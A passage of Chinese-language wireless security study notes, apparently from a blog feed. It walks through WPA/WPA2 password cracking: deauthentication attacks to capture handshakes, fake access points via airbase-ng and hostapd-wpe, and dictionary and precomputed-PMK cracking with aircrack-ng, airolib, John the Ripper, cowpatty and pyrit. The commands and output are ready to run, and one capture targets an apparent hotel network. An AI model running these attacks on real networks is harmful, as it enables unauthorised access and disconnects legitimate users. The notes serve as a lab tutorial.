<li>patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</li>
<li>cd hostapd</li>
<li>make</li>
</ul>
</li>
</ul>
<ul>
<li>生成证书<ul>
<li>cd ../../hostapd-wpe/certs ./bootstrap</li>
</ul>
</li>
<li>service network-manager stop</li>
<li>airmon-ng check kill</li>
<li>映射无线网卡</li>
<li>ifconfig wlan2 up</li>
<li>启动伪造ap<ul>
<li>cd ../../hostapd-2.2/hostapd</li>
<li>./hostapd-wpe hostapd-wpe.conf</li>
</ul>
</li>
<li>asleap -C challenge -R response -W &lt;Dictionary_File&gt;</li>
</ul>
<h2 id="02-无线侦察"><a href="#02-无线侦察" class="headerlink" title="02-无线侦察"></a>02-无线侦察</h2><ul>
<li>kismet<ul>
<li>无线侦听领域内仅存不多的工具之一</li>
<li>但13年就停止更新，可能后几年kali中就不再集成</li>
<li>kismet* .nettxt</li>
<li>kismet* .pcapdump</li>
</ul>
</li>
<li><p>命令</p>
<ul>
<li>gpsd -n -N -D4 /dev/ttyUSB0</li>
<li>giskismet -x Kismet-<em>.netxml • giskismet -q “select </em> from wireless</li>
<li>giskismet -q “select * from wireless” -o gps.kml</li>
</ul>
</li>
<li><p>Google地图</p>
<ul>
<li>下载  <a href="http://dl.google.com/dl/earth/client/current/google-earthstable_current_amd64.deb" target="_blank" rel="noopener">http://dl.google.com/dl/earth/client/current/google-earthstable_current_amd64.deb</a></li>
<li>dpkg -i google-earth64.deb</li>
<li>apt-get -f install</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>WPA企业</tag>
        <tag>无线侦听</tag>
      </tags>
  </entry>
  <entry>
    <title>WPA攻击</title>
    <url>/2018/02/18/wireless/WPA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="01-姿势一：普通的WPA破解"><a href="#01-姿势一：普通的WPA破解" class="headerlink" title="01-姿势一：普通的WPA破解"></a>01-姿势一：普通的WPA破解</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1-简介"></a>1.1-简介</h2><ul>
<li>基于字典的破解，字典越大，命中率越高，若密码异常复杂，则不会破解出来（即使字典很大，不包含也白搭）</li>
<li>WPA2比WPA1更加安全，理论上是这样，因为其加密算法更加安全，但现实中，无论是WPA还是WPA2，如果设置高强度密码，则破解难度都很大，几乎都是难以破解（故实际中，二者破解难度可以看作是一样的）</li>
<li>破解WPA是有一定运气成分的</li>
<li>字典来源<a id="more"></a><ul>
<li>网上共享的字典（质量低）</li>
<li>已泄露的密码</li>
<li>某一地区电话号码段</li>
<li>Crunch生成字典（生日等社工相关信息）</li>
<li>Kali中自带的字典文件（通用的，并不是无线破解专用）</li>
</ul>
</li>
<li>WPA安全很多，只有一种密码破解方法<ul>
<li>WPA不存在WEP的弱点</li>
</ul>
</li>
<li>只能暴力破解，影响暴力破解的因素<ul>
<li>CPU资源</li>
<li>时间</li>
<li>字典质量</li>
</ul>
</li>
</ul>
<h2 id="1-2-破解过程"><a href="#1-2-破解过程" class="headerlink" title="1.2-破解过程"></a>1.2-破解过程</h2><blockquote>
<p>WPA破解过程比WEP简单很多，但是破解难度要难太多</p>
</blockquote>
<p><strong>（1）启动monitor</strong></p>
<ul>
<li><code>airmon-ng check kill</code></li>
<li><code>airmon-ng start wlan0</code></li>
</ul>
<p><strong>（2）开始抓包并保存本地</strong></p>
<ul>
<li><p><code>airodump-ng --bssid 30:49:3B:09:F3:88 -c 1 -w dell wlan0mon</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH  1 ][ Elapsed: 2 mins ][ 2018-02-03 20:21 ][ WPA handshake: 30:49:3B:09:F3:88                                                                              </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line">30:49:3B:09:F3:88  -55 100      941     4283   25   1  54   WPA2 CCMP   PSK  HUAZHU_Hanting                                           </span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Probe                     </span><br><span class="line">30:49:3B:09:F3:88  AC:D1:B8:C7:DC:3F  -35   54 -24      0     4216 </span><br><span class="line">30:49:3B:09:F3:88  70:F0:87:7F:2B:91  -38   54 -24      0     1497</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>（3）Deauthentication攻击获取4步握手信息</strong></p>
<ul>
<li><p><code>aireplay-ng -0 1 -a 30:49:3B:09:F3:88 -c 70:F0:87:7F:2B:91 wlan0mon</code>来打掉STA和AP之间的连接</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/48835764.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<ul>
<li>可以看到，airodump中已抓到WPA的握手信息</li>
<li>自己的手机明显掉了一会线，其尝试重连时数据包被抓</li>
</ul>
</li>
</ul>
<p><strong>（4）使用字典暴力破解/</strong></p>
<ul>
<li><p><code>aircrack-ng -w dic.txt dell-01.cap</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/43950487.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<ul>
<li><p>若密码存在与字典中，是可以破解出来的</p>
</li>
<li><p>测试所用，故将密码直接写入字典文件（由此可见，字典很重要！）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/22015951.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/59371932.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h1 id="02-姿势二：无AP的WPA破解"><a href="#02-姿势二：无AP的WPA破解" class="headerlink" title="02-姿势二：无AP的WPA破解"></a>02-姿势二：无AP的WPA破解</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1-简介"></a>2.1-简介</h2><ul>
<li><p>适用场景</p>
<ul>
<li><p>H附近只有某客户端STA，而没有AP</p>
</li>
<li><p>STA以前连接过AP，到了一个新环境后，仍然会发送probe，来探测这个AP是否依然在自己范围内</p>
</li>
<li><p>H利用STA发送的探测包，就可以破解出其曾经连接过的AP的密码</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/69395113.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="2-2-攻击原理"><a href="#2-2-攻击原理" class="headerlink" title="2.2-攻击原理"></a>2.2-攻击原理</h2><ul>
<li>图示</li>
</ul>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/92843293.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-3/31015488.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<ul>
<li><p>相关值</p>
<ul>
<li>PMK：是未知且要破解的值。是ESSID+密钥（即PSK，预设共享密钥），进行4096次哈希计算后（需要消耗大量的时间资源），生成的哈希值</li>
<li>Anonce：AP向STA发送一个Anonce，为Nonce1（anthenticator—AP，supplicant—STA）</li>
<li>Snonce：STA本地也会生成一个Snonce，为Nonce2</li>
<li>MAC地址：STA要与AP通信，自然知道二者的MAC地址，即MAC1和MAC2</li>
<li>PTK及其MIC：PMK结合这四者，生成PTK，将PTK的MIC（一个摘要信息）连同Snonce发往AP</li>
</ul>
</li>
<li><p>破解原理</p>
<ul>
<li><p><strong>Anonce、Snonce已知</strong>：二者是明文传输的，可以在通信过程中抓取到，这样，相关的信息在四步握手的前两步就可以获得，就可以进行相应的破解</p>
</li>
<li><p><strong>ESSID已知</strong>：H自己伪造一个AP（STA试图探测的AP名字）</p>
</li>
<li><p><strong>MAC地址已知</strong>：airodump抓包，可以得到STA的MAC和其探测的AP的名字（即ESSID</p>
</li>
<li><p>PMK未知</p>
<p>：是ESSID+密钥（即PSK，预设共享密钥），进行哈希计算后，生成的值</p>
<ul>
<li>ESSID已知，PSK是想知道的，有二者便可的PMK</li>
<li>Anounce和Snonce、MAC1和MAC2、MIC（PTK的摘要信息）已知</li>
</ul>
</li>
<li><p><strong>唯独PSK未知，以此尝试，ESSID+PSKx=PMKx，PMKx+四信息=PTKx，PTKx得其摘要MICx，再与真正MIC比较，若一致则PSK正确</strong></p>
</li>
<li><p>理论上，是可以破解出来的。</p>
</li>
</ul>
</li>
</ul>
<h2 id="2-3-破解过程"><a href="#2-3-破解过程" class="headerlink" title="2.3-破解过程"></a>2.3-破解过程</h2><blockquote>
<ol>
<li>启动monitor</li>
<li>开始抓包并保存</li>
<li>根据probe信息伪造相同的ESSID的AP</li>
<li>抓取四步握手中的前两个包</li>
<li>使用字典暴力破解</li>
</ol>
</blockquote>
<ul>
<li><p>启动monitor</p>
<ul>
<li><code>airmon-ng check kill</code></li>
<li><code>airmon-ng start wlan0</code></li>
</ul>
</li>
<li><p>开始抓包并保存</p>
<ul>
<li><p><code>ariodump-ng wlan0mon -w dell</code></p>
</li>
<li><p>抓到探测“DELL”的包</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-8/80358421.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
</ul>
</li>
<li><p>根据probe信息伪造相同的ESSID的AP</p>
<ul>
<li><p><code>airbase-ng --essid DELL -Z 4 wlan0mon</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-8/72981338.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-8/9948573.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-8/98318349.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
</ul>
</li>
<li><p>抓取四步握手中的前两个包</p>
<ul>
<li>理想情况下会抓到握手过程（四步握手的前两步</li>
<li>但是实际测试时，握手过程抓取失败</li>
</ul>
</li>
<li><p>使用字典暴力破解</p>
<ul>
<li><code>aircrack-ng -w dic.txt xxx.cap</code>（若抓到握手包）</li>
</ul>
</li>
</ul>
<h2 id="2-4-其它"><a href="#2-4-其它" class="headerlink" title="2.4-其它"></a>2.4-其它</h2><ul>
<li><p>理论上是可以破解出来的，但是比较鸡肋的是，需要到AP范围内才可以上网（尾随STA）</p>
</li>
<li><p>伪造AP是一个关键问题：</p>
<ul>
<li>airbase-ng，可以将本机网卡，创建一个AP出来</li>
<li>如：<code>airbase-ng --essid DELL -c 11 wlan0mon</code></li>
</ul>
</li>
<li><p>存在一问题，即伪造的AP，其采用什么身份认证和加密方式是未知的</p>
<ul>
<li>为提高准确性，即保证STA能与伪造后的AP通信，可以创建多个AP</li>
<li>分别采取不同的身份认证和加密方式：OPEN不用身份认证、WEP、WPA、WPA2</li>
<li>但是网卡可能不支持创建多个类型的网卡，也可能是虚拟机环境的缘故，物理机下是可用的，实测只创建出WPA2的</li>
</ul>
</li>
<li><p>创建不同类型AP</p>
<ul>
<li><p>默认是OPEN的方式，不采用任何身份认证，随便连</p>
</li>
<li><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-8/76514660.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
<li><p><code>airbase-ng --essid DELL -c 11 -z 2 wlan0mon</code>（z：表WPA；2：表TKIP加密）</p>
</li>
<li><p><code>airbase-ng --essid DELL -c 11 -Z 4 wlan0mon</code>（Z：表WPA2；4：表CCMP加密）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-8/3546928.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
<li><p>具体参数，–help</p>
</li>
</ul>
</li>
<li><p>理想情况下，握手情况会被抓取到，但实际测试时不尽人意</p>
</li>
</ul>
<blockquote>
<p>WPA破解的姿势就是上述两种，目前还没有发现第三种攻击手法可用</p>
</blockquote>
<h1 id="03-其它工具"><a href="#03-其它工具" class="headerlink" title="03-其它工具"></a>03-其它工具</h1><h2 id="3-1-airolib"><a href="#3-1-airolib" class="headerlink" title="3.1-airolib"></a>3.1-airolib</h2><h3 id="（1）简介"><a href="#（1）简介" class="headerlink" title="（1）简介"></a>（1）简介</h3><ul>
<li>提高破解效率<ul>
<li>WPA破解的姿势就是上述两种，目前还没有发现第三种攻击手法可用</li>
<li>对于WPA，关键不是如何抓到供破解的信息（即数据包），而是如何高效率的完成破解工作</li>
<li>WPA破解，后期的破解过程远比前期的信息收集（即抓包）重要的多</li>
<li>Kali中集成了许多提高WPA破解效率的工具，airolib便是其中之一</li>
</ul>
</li>
<li><p>思路：</p>
<ul>
<li>WPA破解原理：PSK未知，依次尝试，ESSID+PSKx=PMKx，PMKx+四信息=PTKx，PTKx得其摘要MICx，再与真正MIC比较，若一致则PSK正确</li>
<li>由无AP的WPA破解可得知，破解WPA主要有两个过程：计算PMK和PTK<ul>
<li>PMK需要4096次哈希计算，需大量时间资源和CPU资源</li>
<li>计算PTK及其MIC值，相比就不需要那么多资源</li>
</ul>
</li>
<li>故WPA破解的主要难度是在PMK计算上</li>
<li>思路：先将最麻烦的PMK计算出来，存储在一个表，需要时直接拿来用</li>
<li>最后比较MIC是否一致来确定尝试的密码是否正确，若正确，则反推出密码</li>
</ul>
</li>
<li><p>简介</p>
<ul>
<li>airolib是aircrack-ng套件中工具之一，用于提高破解效率</li>
<li>使用了数据库，存放ESSID、明文密码列表、计算生成的PMK值</li>
<li>若目标网络更改了ESSID即网络名，那么之前生成的PMK就全部失效了，就需要重新开始生成</li>
<li>针对某一个ESSID，提前生成PMK表，破解的时候直接拿来用</li>
<li>适应场景：针对一个特定无线网络（其密码经常更改，但是其ESSID不改）</li>
<li>设计用于存储ESSID和密码列表<ul>
<li>计算生成不变的PMK（计算资源消耗型</li>
<li>PMK在破解阶段被用于计算PTK</li>
<li>通过完整性摘要值破解密码</li>
<li>SQLite3数据库存储数据</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="（2）实例演示"><a href="#（2）实例演示" class="headerlink" title="（2）实例演示"></a>（2）实例演示</h3><ul>
<li><p>简要步骤</p>
<ul>
<li><p><code>echo kifi &gt; essid.txt</code> （ESSID写入文本文件，可写入多个ESSID）</p>
</li>
<li><p><code>airolib-ng db --import essid essid.txt</code> （创建数据库db，同时从本地导入ESSID）</p>
</li>
<li><p><code>airolib-ng db --stats</code> （查看数据库状态）</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airolib-ng db --import passwd dic.txt</span><br></pre></td></tr></table></figure>
<p>（导入密码文件）</p>
<ul>
<li>自动剔除不合格的WPA字典</li>
<li>不是每一个密码都使用WPA破解，例如小于8个字符</li>
</ul>
</li>
<li><p>可以再次stats查看状态，发现密码已导入</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airolib-ng db --batch</span><br></pre></td></tr></table></figure>
<ul>
<li>生成PMK哈希值</li>
<li>根据ESSID和密码列表，组合在一起，进行4096次哈希计算，得到PMK，供后续使用</li>
</ul>
</li>
<li><p><code>aircrack-ng -r db wpa.cap</code>（通过db中存取的PMK，来进行破解）</p>
</li>
</ul>
</li>
<li><p>实例演示</p>
<ol>
<li><p>essid写入指定文件，以便后续导入数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo D-Link_DIR-612 &gt; essid.txt</span><br><span class="line">root@kali:~# cat essid.txt </span><br><span class="line">D-Link_DIR-612</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建数据库并导入esssid</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --import essid essid.txt </span><br><span class="line">Database &lt;db&gt; does not already exist, creating it...</span><br><span class="line">Database &lt;db&gt; successfully created</span><br><span class="line">Reading file...</span><br><span class="line">Writing...</span><br><span class="line">Done.</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
</li>
<li><p>导入存放密码的字典文件（密码即PSK，即待破解的无线密码）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --import passwd dic.txt </span><br><span class="line">Reading file...</span><br><span class="line">Writing...s read, 0 invalid lines ignored.</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看数据库状态，essid和password已经导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --stats</span><br><span class="line">There are 1 ESSIDs and 11 passwords in the database. 0 out of 11 possible combinations have been computed (0%).</span><br><span class="line"></span><br><span class="line">ESSID	Priority	Done</span><br><span class="line">D-Link_DIR-612	64	0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始生成PMK值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airolib-ng db --batch</span><br><span class="line">Computed 11 PMK in 0 seconds (11 PMK/s, 0 in buffer). All ESSID processed.</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# aircrack-ng -r db test.cap </span><br><span class="line">Opening test.cap</span><br><span class="line">Read 9088 packets.</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  C4:A8:1D:E1:65:F8  D-Link_DIR-612            WPA (1 handshake)</span><br><span class="line">Choosing first network as target.</span><br><span class="line">Opening test.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line">      [00:00:00] 2/0 keys tested (820.01 k/s) </span><br><span class="line">      Time left: 0 seconds                                   inf%</span><br><span class="line">                           KEY FOUND! [ 12341234 ]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ul>
<h2 id="3-2-JTR（john）"><a href="#3-2-JTR（john）" class="headerlink" title="3.2-JTR（john）"></a>3.2-JTR（john）</h2><h3 id="（1）简介-1"><a href="#（1）简介-1" class="headerlink" title="（1）简介"></a>（1）简介</h3><ul>
<li>join the ripper</li>
<li>不仅支持无线破解，还支持其它</li>
<li>支持基于规则扩展密码字典，动态生成</li>
<li>不同于airolib提前生成PMK，不是用来提高破解速度的</li>
<li>是为了动态生成密码，避免大文件字典占用物理空间</li>
<li>关键点<ul>
<li>构造基础密码文件</li>
<li>编写动态生成密码的规则</li>
<li>小密码字典+规则=旁大密码字典=节约物理空间</li>
</ul>
</li>
</ul>
<h3 id="（2）实例演示-1"><a href="#（2）实例演示-1" class="headerlink" title="（2）实例演示"></a>（2）实例演示</h3><ul>
<li><p>实例演示（利用JTR动态生成手机号）</p>
<ul>
<li>很多人喜欢用手机号码做为无线密码（获取号码并利用JTR规则增加最后几位的数字</li>
</ul>
</li>
<li><p>网上得某地区某个手机号段，并保存到本地，作为基础密码文件（后续在其基础上动态生成手机号</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-10/41999333.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# gedit base.txt</span><br><span class="line">root@kali:~# more base.txt</span><br><span class="line">1340226</span><br><span class="line">1340536</span><br><span class="line">1340646</span><br><span class="line">1340647</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件<code>/etc/john/john.conf</code></p>
<ul>
<li><p>搜索<code>[List.Rules:Wordlist]</code>，在其这一段最后添加规则，如下</p>
</li>
<li><p><code>$[0-9]$[0-9]$[0-9]$[0-9]</code>（表示后面再加4位数字）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-10/10223264.jpg?ynotemdtimestamp=1550490850588" alt="img"></p>
</li>
</ul>
</li>
<li><p>测试效果</p>
<ul>
<li><p><code>john --wordlist=base.txt--rules --stdou</code></p>
</li>
<li><p>在base.txt得基础上，根据规则，动态生成了大量密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base.txt --rules --stdout | wc -</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">440044p 0:00:00:00 100.00% (2018-02-10 11:21) 453653p/s 13475699999</span><br><span class="line"> 440044  440044 5280352</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base.txt --rules --stdout</span><br><span class="line">..........</span><br><span class="line">13475679999</span><br><span class="line">13475699999</span><br><span class="line">440044p 0:00:00:11 100.00% (2018-02-10 11:20) 39219p/s 13475699999</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>破解调用</p>
<ul>
<li><code>john --wordlist=base.txt --rules --stdout | aircrack-ng -e D-Link_DIR-612 -w - wpa.cap</code></li>
<li>-e指定ESSID（若只有一个不需要指定），-w指定字典，-是指前面的标准输出stdout</li>
</ul>
</li>
<li><p>实际测试</p>
<ul>
<li><p>测试用的无线网络密码是12341234，重新指定一个基础密码文件base1.txt，内容为1234，规则不变，这样总会生成12341234的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base1.txt --rules --stdout | grep 12341234</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">12341234</span><br><span class="line">10001p 0:00:00:00 100.00% (2018-02-10 11:32) 25002p/s 12349999</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base1.txt --rules --stdout | aircrack-ng -e D-Link_DIR-612 -w - test.cap</span><br><span class="line">Opening test.cap</span><br><span class="line">Opening test.cap please wait...</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line"></span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line">                   [00:00:04] 1244 keys tested (258.73 k/s) </span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 12341234 ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>这种情况下要-e指定essid，否则失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base1.txt --rules --stdout | aircrack-ng -w - test.cap</span><br><span class="line">Please specify an ESSID or BSSID.</span><br><span class="line"></span><br><span class="line">Quitting aircrack-ng...</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="3-3-cowpatty"><a href="#3-3-cowpatty" class="headerlink" title="3.3-cowpatty"></a>3.3-cowpatty</h2><h3 id="（1）简介-2"><a href="#（1）简介-2" class="headerlink" title="（1）简介"></a>（1）简介</h3><ul>
<li>WPA密码通用破解工具，跨平台的</li>
<li>两种破解思路<ul>
<li>思路1：密码字典破解，同aircrack需要一个字典文件</li>
<li>思路2：使用彩虹表破解，类似airolib生成的PMK（只不过后者PMK是保存在数据库中，aircrack破解时从数据库调取，而前者是保存在文件，cowpatty破解时从本地文件调入）</li>
</ul>
</li>
<li>此工具的优势在于彩虹表方式，提前生成彩虹表，为以后的破解做准备</li>
<li>适用场景<ul>
<li>生成彩虹表的时间与直接使用字典破解的方式，时间是差不多的（genpmk和aircrack相比）</li>
<li>使用彩虹表，这种场景适用于破解同一个无线网络，只要其不改ESSID，但频繁改密码，则第一次生成彩虹表后，以后不论其如何更改密码，cowpatty破解即可，速度快</li>
<li>如果改了ESSID，则彩虹表作废，又得重新生成，还得浪费时间</li>
</ul>
</li>
</ul>
<p>###（2）实例演示</p>
<ul>
<li><p>方式1：使用密码字典</p>
<ul>
<li><p><code>cowpatty -r test.cap -f dic.txt -s D-Link_DIR-612</code></p>
</li>
<li><p><code>-f指定密码文件，-s指定ESSID名称,-r指定待破解数据包</code></p>
</li>
<li><p>同aircrack破解思路是相同的，都需要一个字典文件</p>
</li>
<li><p>速度上不如aircrack快，这种方式不是其优势所在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# cowpatty -r test.cap -f dic.txt -s D-Link_DIR-612</span><br><span class="line">cowpatty 4.6 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line"></span><br><span class="line">Collected all necessary data to mount crack against WPA2/PSK passphrase.</span><br><span class="line">Starting dictionary attack.  Please be patient.</span><br><span class="line"></span><br><span class="line">The PSK is &quot;12341234&quot;.</span><br><span class="line"></span><br><span class="line">3 passphrases tested in 0.03 seconds:  88.03 passphrases/second</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>方式2：使用彩虹表</p>
<ol>
<li><code>genpmk -f dic.txt -d pmkhash -s D-Link_DIR-612</code><ul>
<li>需要使用到另一个工具，-f指定密码文件，-s指定ESSID，-d指定输出的文件</li>
</ul>
</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 先根据密码字典生成彩虹表，即PMK集合</span><br><span class="line"></span><br><span class="line">   ```shell</span><br><span class="line">   root@kali:~# genpmk -f dic.txt -d pmkhash -s D-Link_DIR-612</span><br><span class="line">   genpmk 1.1 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line">   File pmkhash does not exist, creating.</span><br><span class="line">   key no. 1000: 65764764123123124124</span><br><span class="line">   key no. 2000: 54234545</span><br><span class="line">   key no. 3000: 12341234</span><br><span class="line">   key no. 4000: 12121212</span><br><span class="line">   key no. 5000: 233434545</span><br><span class="line">   key no. 6000: 34534534</span><br><span class="line">   key no. 7000: 65745745</span><br><span class="line">   key no. 8000: 45748478</span><br><span class="line">   key no. 9000: 45634253</span><br><span class="line">   key no. 10000: 65764764123123124124</span><br><span class="line">   key no. 11000: 54234545</span><br><span class="line"></span><br><span class="line">   11080 passphrases tested in 111.46 seconds:  99.41 passphrases/second</span><br></pre></td></tr></table></figure>
<ul>
<li><p>类似airolib，只不过计算出来的PMK集合是保存在本地文件，而非数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# ls pmkhash </span><br><span class="line">pmkhash</span><br></pre></td></tr></table></figure>
</li>
<li><p>生成的彩虹表文件是加密的，cat查看乱码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1. `cowpatty -r test.cap -d pmkhash -s D-Link_DIR-612`</span><br><span class="line"></span><br><span class="line">   - 有彩虹表后，调用cowpatty来进行密码破解</span><br><span class="line"></span><br><span class="line">   - 破解速度很快，这才是其优势之所在</span><br></pre></td></tr></table></figure>
<p>  root@kali:~# cowpatty -r test.cap -d pmkhash -s D-Link_DIR-612<br>  cowpatty 4.6 - WPA-PSK dictionary attack. <a href="mailto:&#106;&#119;&#x72;&#x69;&#x67;&#x68;&#116;&#x40;&#104;&#x61;&#115;&#x62;&#x6f;&#114;&#103;&#46;&#x63;&#x6f;&#109;" target="_blank" rel="noopener">&#106;&#119;&#x72;&#x69;&#x67;&#x68;&#116;&#x40;&#104;&#x61;&#115;&#x62;&#x6f;&#114;&#103;&#46;&#x63;&#x6f;&#109;</a></p>
<p>  Collected all necessary data to mount crack against WPA2/PSK passphrase.<br>  Starting dictionary attack.  Please be patient.</p>
<p>  The PSK is “12341234”.</p>
<p>  3 passphrases tested in 0.00 seconds:  21428.57 passphrases/second</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 3.4-pyrit</span><br><span class="line"></span><br><span class="line">### （1）简介</span><br><span class="line"></span><br><span class="line">- GPU相关</span><br><span class="line">  - 除了利用CPU，还可以利用GPU，图形显卡中</span><br><span class="line">  - GPU计算能力很强大，不亚于CPU，甚至在其之上</span><br><span class="line">  - CPU在8核、16核这种量级，而GPU在千核级别</span><br><span class="line">  - GPU用途：处理图形流、大量的数学计算、密码破解</span><br><span class="line">  - 若GPU运用得当，可以很好的提高效率</span><br><span class="line">- airolib、cowpatty都要先计算彩虹表，而这一过程二者都是无法提高效率的，都要按部就班，没有提升空间，</span><br><span class="line">- 除非彩虹表重复利用，否则还不如直接用aircrack效率高</span><br><span class="line">- 与airolib、cowpatty相同，支持基于预计算的PMK提高破解速度</span><br><span class="line">- pyrit也是需要提前生成PMK，但可以使用GPU，以此来提高效率</span><br><span class="line">- 独有的优势</span><br><span class="line">  - 除CPU之外pyrit可以运用GPU的强大运算能力加速生成PMK</span><br><span class="line">  - 本身支持抓包获取四步握手过程，无需用airodum抓包</span><br><span class="line">  - 也支持传统的读取airodump抓包获取四步握手的方式</span><br><span class="line">- 两种数据包来源</span><br><span class="line">  - pyrit自身支持抓包</span><br><span class="line">  - 也可以使用airodump抓的包</span><br><span class="line">- 支持两种破解模式</span><br><span class="line">  - 密码字典破解</span><br><span class="line">  - 数据库模式（即利用提前生成的PMK）</span><br><span class="line"></span><br><span class="line">### （2）抓包相关</span><br><span class="line"></span><br><span class="line">- pyrit抓包</span><br><span class="line"></span><br><span class="line">  - 只是抓取WPA四次握手的数据包，剔除其它无用的数据，这样物理空间占用的少</span><br><span class="line">  - `pyrit -r wlan2mon -o wpapyrit.cap striplive`</span><br><span class="line">    - -r，指定开启monitor模式的网卡</span><br><span class="line">    - -o，抓取的数据包保存到本地</span><br><span class="line">    - striplive，把不需要的包剔除掉，只留下握手包）</span><br><span class="line">  - wpapyrit.cap是pyrot抓取的数据包，与airodump抓到的数据包格式是不同的，同样可以拿来破解密码，但是使用的参数是不同的，</span><br><span class="line">  - `pyrit -r wpapyrit.cap analyze`（分析数据包）</span><br><span class="line"></span><br><span class="line">- 导入airodump抓取的包</span><br><span class="line"></span><br><span class="line">  - 